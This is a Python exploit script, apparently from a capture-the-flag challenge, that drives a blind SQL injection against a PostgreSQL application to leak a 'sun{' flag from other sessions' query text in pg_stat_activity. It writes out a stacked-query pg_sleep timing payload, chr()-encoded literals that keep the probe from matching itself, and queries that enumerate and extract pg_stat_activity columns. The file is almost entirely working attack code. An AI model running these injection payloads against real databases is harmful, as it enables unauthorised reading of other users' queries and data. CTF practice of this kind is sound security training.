#!/usr/bin/env python
"""Where is the flag?  It is not stored in the database at all.

Established: octet_length(description) <> length(description) somewhere in planets (real
multi-byte characters), `zleak.v` literally says `select v from zleak`, and stacked
statements execute (`MARS'; SELECT pg_sleep(3)-- ` costs 3.8 s, same as the single-statement
control -- the earlier CREATE TABLE probe failed only because PostgreSQL 15 revoked CREATE
on the public schema for PUBLIC).  pg_stat_activity is readable, so the leak channel the
table name hints at is another backend's query text.

Every pattern here is assembled with chr() so the string being hunted never appears in my
own SQL: otherwise pg_stat_activity matches the probe that is asking the question, and the
"flag" you extract is your own query text.
"""
import json
import os
import sys
import time

import extract as E


def lit(s):
    """chr(115)||chr(117)... -- build a literal without spelling it in the payload."""
    return "||".join("chr(%d)" % ord(c) for c in s)


SUNK = lit("sun{")
CLOSE = lit("}")

SEES = ("SELECT count(*) FROM pg_stat_activity WHERE pid<>pg_backend_pid() "
        "AND position(%s in query)>0" % SUNK)

FLAGQ = ("(SELECT substr(query, position(%s in query), 90) FROM pg_stat_activity "
         "WHERE pid<>pg_backend_pid() AND position(%s in query)>0 "
         "ORDER BY pid LIMIT 1)" % (SUNK, SUNK))


def who():
    cols = ["pid", "usename", "application_name", "state", "backend_type", "wait_event"]
    for c in cols:
        e = "(SELECT %s::text FROM pg_stat_activity WHERE pid<>pg_backend_pid() AND position(%s in query)>0 LIMIT 1)" % (c, SUNK)
        print("[=] pgsa.%-14s %r" % (c, E.read_str(e, 60, "pgsa." + c)), flush=True)


def where_flag_columns():
    """Which pg_stat_activity column carries the flag text?"""
    for c in ["query", "application_name", "client_hostname", "state", "backend_type", "wait_event_type"]:
        try:
            r = E.cond("(SELECT count(*) FROM pg_stat_activity WHERE %s LIKE '%%'||(%s)||'%%')>0"
                      % (c, SUNK))
        except Exception:
            r = "EXC"
        print("   %-16s sun{ -> %s" % (c, r))


if __name__ == "__main__":
    print("[*] backends (not me) whose query contains sun{ :", E.num(SEES), flush=True)
    print("[*] any backend (not me) at all:", E.num("(SELECT count(*) FROM pg_stat_activity WHERE pid<>pg_backend_pid())"), flush=True)
    where_flag_columns()
    who()
    v = E.read_str(FLAGQ, 200, "flag-from-pgsa")
    print("[+] extracted: %r" % v, flush=True)
    if v:
        open("flag.txt", "w").write(v.strip() + "\n")
    print("[*] %d probes" % E.CALL[0], flush=True)
